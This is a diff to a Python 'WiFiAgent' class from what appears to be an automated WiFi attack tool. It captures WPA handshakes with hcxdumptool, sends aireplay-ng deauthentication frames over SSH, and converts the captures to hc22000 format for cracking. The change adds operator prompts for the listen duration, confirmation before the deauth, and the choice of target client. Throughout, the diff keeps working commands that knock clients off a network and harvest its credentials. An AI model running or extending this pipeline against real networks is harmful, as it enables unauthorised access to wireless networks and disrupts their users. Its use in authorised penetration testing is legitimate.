@@ -497,16 +497,15 @@ class WiFiAgent(BaseAgent):
 
         Two-phase approach -- minimum footprint first, escalate only if needed:
 
-        Phase 3a -- passive listen (30s, no packets transmitted)
+        Phase 3a -- passive listen (operator-selected duration, no packets transmitted)
             Silent. Waits for AP to broadcast PMKID or a client to
             naturally authenticate. Checks handshake completeness before
             accepting -- incomplete handshakes produce false positive cracks.
 
-        Phase 3b -- active deauth (remaining timeout)
-            Only runs if Phase 3a yields nothing usable.
-            Opens two SSH channels on the same transport simultaneously:
-            one for hcxdumptool capture, one for aireplay-ng deauth.
-            Deauth forces a fresh complete M1-M4 handshake.
+        Phase 3b -- active deauth (operator confirmed, operator selects target client)
+            Only runs if Phase 3a yields nothing usable AND operator confirms.
+            Operator picks which connected client to deauth -- avoids disrupting
+            critical devices (cameras, alarm systems) when softer targets exist.
 
         Args:
             bssid: Target BSSID in xx:xx:xx:xx:xx:xx format.
@@ -532,9 +531,18 @@ class WiFiAgent(BaseAgent):
 
         # -----------------------------------------------------------------
         # Phase 3a -- passive listen, no deauth
+        # Operator selects how long to listen passively before giving up
         # -----------------------------------------------------------------
-        PASSIVE_TIMEOUT = 30
-        print(f"[WiFiAgent] Phase 3a -- passive listen ({PASSIVE_TIMEOUT}s, no packets transmitted)...") #NORMAL
+        print(f"\n[WiFiAgent] Phase 3a -- passive listen duration:") #NORMAL
+        print(f"  1  30s   (quick, low chance of catching natural auth)") #NORMAL
+        print(f"  2  60s   (balanced)") #NORMAL
+        print(f"  3  90s   (better chance on busy networks)") #NORMAL
+        print(f"  4  120s  (maximum passive -- very patient)") #NORMAL
+        print(f"[WiFiAgent] Select duration (1-4, default 2): ", end="") #NORMAL
+        duration_choice = input().strip()
+        passive_timeout_map = {"1": 30, "2": 60, "3": 90, "4": 120}
+        PASSIVE_TIMEOUT = passive_timeout_map.get(duration_choice, 60)
+        print(f"[WiFiAgent] Passive listen: {PASSIVE_TIMEOUT}s, no packets transmitted...") #NORMAL
 
         passive_command = (
             f"sudo timeout {PASSIVE_TIMEOUT} "
@@ -544,6 +552,8 @@ class WiFiAgent(BaseAgent):
         )
 
         pmkid_found = False
+        # Track connected clients seen during passive phase for deauth selection
+        seen_clients, detected_channel = {}, None
         try:
             ssh = self._get_ssh()
             stdin, stdout, stderr = ssh.exec_command(
@@ -563,6 +573,30 @@ class WiFiAgent(BaseAgent):
                     pmkid_found = True
                     print(f"[WiFiAgent] EAPOL frames seen (passive)...") #NORMAL
 
+
+                # Grab AP channel from hcxdumptool outpu, more reliable than iw scan
+                # since hcxdumptool already has wlan1 in monitor mode
+                if "|" in line and not line.startswith("-") and not line.startswith("C"):
+                    parts = line.split("|")
+                    if len(parts) >= 5 and parts[0].strip().isdigit():
+                        detected_channel = parts[0].strip()
+
+
+                # Parse client MACs from hcxdumptool output for deauth selection
+                # Line format: channel|time|flags|client_mac|ap_mac|ssid
+                if "|" in line:
+                    parts = line.split("|")
+                    if len(parts) >= 5:
+                        client_mac = parts[3].strip()
+                        if len(client_mac) == 12 and all(
+                            c in "0123456789abcdefABCDEF" for c in client_mac
+                        ):
+                            formatted = ":".join(
+                                client_mac[i:i+2] for i in range(0, 12, 2)
+                            ).lower()
+                            if formatted not in seen_clients:
+                                seen_clients[formatted] = formatted
+
             stdout.channel.recv_exit_status()
 
         except Exception as e:
@@ -573,9 +607,7 @@ class WiFiAgent(BaseAgent):
         exit_code, out, _ = self._ssh_run("stat -c%s /tmp/capture.pcapng 2>/dev/null")
         passive_size = int(out.strip() or "0") if exit_code == 0 and out else 0
 
-        # Check handshake completeness -- WPA*02* indicates a usable complete
-        # handshake. WPA*01* alone is PMKID only and may produce false positives.
-        # Only accept passive capture if we have at least one complete handshake.
+        # Check handshake completeness
         complete_handshakes = 0
         if pmkid_found and passive_size > 0:
             self._ssh_run(
@@ -594,36 +626,66 @@ class WiFiAgent(BaseAgent):
 
         if pmkid_found and passive_size > 0 and complete_handshakes > 0:
             print(f"[WiFiAgent] Passive capture successful with complete handshake -- skipping deauth") #NORMAL
-            # Use the check file as the final capture since it's already converted
             self._ssh_run("cp /tmp/capture_check.hc22000 /tmp/capture.hc22000", timeout=5)
             return True
         elif pmkid_found and passive_size > 0:
-            print(f"[WiFiAgent] Passive capture incomplete handshake -- escalating to active deauth") #NORMAL
+            print(f"[WiFiAgent] Passive capture incomplete handshake -- deauth needed for complete handshake") #NORMAL
         else:
-            print(f"[WiFiAgent] Passive capture yielded nothing -- escalating to active deauth") #NORMAL
+            print(f"[WiFiAgent] Passive capture yielded nothing") #NORMAL
 
         # -----------------------------------------------------------------
-        # Phase 3b -- active deauth + capture simultaneously
-        # Opens two channels on the same SSH transport:
-        #   Channel 1 -- hcxdumptool capture
-        #   Channel 2 -- aireplay-ng deauth (forces complete M1-M4 handshake)
-        # Deauth runs 5s after capture starts so hcxdumptool is fully
-        # initialized before we force client reconnection.
+        # Phase 3b -- active deauth, operator confirmation required
         # -----------------------------------------------------------------
+
+        # Ask operator before sending any deauth packets
+        print(f"\n[WiFiAgent] Phase 3b requires sending deauth frames (active, detectable).") #NORMAL
+        print(f"[WiFiAgent] Proceed with active deauth? (yes/no): ", end="") #NORMAL
+        deauth_confirm = input().strip().lower()
+        if deauth_confirm != "yes":
+            print(f"[WiFiAgent] Active deauth skipped by operator") #NORMAL
+            # Return True if we have any capture data to attempt conversion on
+            return passive_size > 0
+
+        # Show operator which clients were seen and let them pick the deauth target
+        # Deauthing a printer or phone is less disruptive than a security camera or alarm
+        deauth_target = None
+        if seen_clients:
+            client_list = list(seen_clients.keys())
+            print(f"\n[WiFiAgent] Connected clients seen during passive phase:") #NORMAL
+            print(f"  {'#':<4} {'Client MAC'}") #NORMAL
+            print(f"  {'-'*25}") #NORMAL
+            for i, mac in enumerate(client_list, start=1):
+                print(f"  {i:<4} {mac}") #NORMAL
+            print(f"  0    Broadcast deauth (all clients -- more disruptive)") #NORMAL
+            print(f"\n[WiFiAgent] Select client to deauth (0-{len(client_list)}): ", end="") #NORMAL
+            client_choice = input().strip()
+            try:
+                idx = int(client_choice)
+                if idx == 0:
+                    deauth_target = None  # broadcast
+                    print(f"[WiFiAgent] Broadcast deauth selected") #NORMAL
+                elif 1 <= idx <= len(client_list):
+                    deauth_target = client_list[idx - 1]
+                    print(f"[WiFiAgent] Target client: {deauth_target}") #NORMAL
+                else:
+                    print(f"[WiFiAgent] Invalid selection -- using broadcast deauth") #NORMAL
+            except ValueError:
+                print(f"[WiFiAgent] Invalid input -- using broadcast deauth") #NORMAL
+        else:
+            print(f"[WiFiAgent] No clients seen in passive phase -- using broadcast deauth") #NORMAL
+
         ACTIVE_TIMEOUT = CAPTURE_TIMEOUT_SECONDS - PASSIVE_TIMEOUT
+        # Ensure minimum active timeout
+        if ACTIVE_TIMEOUT < 30:
+            ACTIVE_TIMEOUT = 30
         print(f"[WiFiAgent] Phase 3b -- active deauth ({ACTIVE_TIMEOUT}s)...") #NORMAL
 
         # Remove passive capture file so active phase starts fresh
         self._ssh_run("sudo rm -f /tmp/capture.pcapng /tmp/capture_check.hc22000", timeout=5)
 
-        # Detect target channel -- needed to lock aireplay-ng to correct channel
-        # hcxdumptool manages its own channel internally, only aireplay-ng needs this
-        _, chan_out, _ = self._ssh_run(
-            f"sudo iw dev wlan1 scan 2>/dev/null | grep -A5 '{bssid}' | "
-            f"grep 'primary channel' | awk '{{print $3}}'",
-            timeout=20
-        )
-        target_channel = chan_out.strip() if chan_out.strip().isdigit() else "6"
+        # Detect target channel for aireplay-ng
+        target_channel = detected_channel if detected_channel else "6"
+        if VERBOSE: print(f"[WiFiAgent] Using channel {target_channel} from passive scan") #VERBOSE
         if VERBOSE: print(f"[WiFiAgent] Target channel: {target_channel}") #VERBOSE
 
         capture_cmd = (
@@ -632,26 +694,28 @@ class WiFiAgent(BaseAgent):
             f"--bpf=/tmp/filter.bpf --rds=2 2>&1"
         )
 
-        # Deauth runs after 5s delay -- gives hcxdumptool time to initialize
-        # before we force clients to reconnect
-        deauth_cmd = (
-            f"sleep 5 && sudo iwconfig wlan1 channel {target_channel} 2>/dev/null; "
-            f"sudo aireplay-ng -0 5 -a {bssid} wlan1 2>&1"
-        )
+        # Build deauth command -- target specific client or broadcast
+        if deauth_target:
+            deauth_cmd = (
+                f"sleep 5 && sudo iwconfig wlan1 channel {target_channel} 2>/dev/null; "
+                f"sudo aireplay-ng -0 5 -a {bssid} -c {deauth_target} wlan1 2>&1"
+            )
+        else:
+            deauth_cmd = (
+                f"sleep 5 && sudo iwconfig wlan1 channel {target_channel} 2>/dev/null; "
+                f"sudo aireplay-ng -0 5 -a {bssid} wlan1 2>&1"
+            )
 
         pmkid_found = False
         try:
             transport = self._get_ssh().get_transport()
 
-            # Channel 1 -- hcxdumptool capture (primary, we read stdout)
             cap_channel = transport.open_session()
             cap_channel.exec_command(capture_cmd)
 
-            # Channel 2 -- aireplay-ng deauth (fire and forget)
             deauth_channel = transport.open_session()
             deauth_channel.exec_command(deauth_cmd)
 
-            # Read capture stdout line by line
             cap_channel.settimeout(ACTIVE_TIMEOUT + 10)
             while True:
                 try:
@@ -694,7 +758,6 @@ class WiFiAgent(BaseAgent):
             print(f"[WiFiAgent] No PMKID/EAPOL seen in stdout -- attempting conversion anyway") #NORMAL
 
         return True
-
     # -------------------------------------------------------------------------
     # Phase 4 -- convert to hc22000
     # -------------------------------------------------------------------------
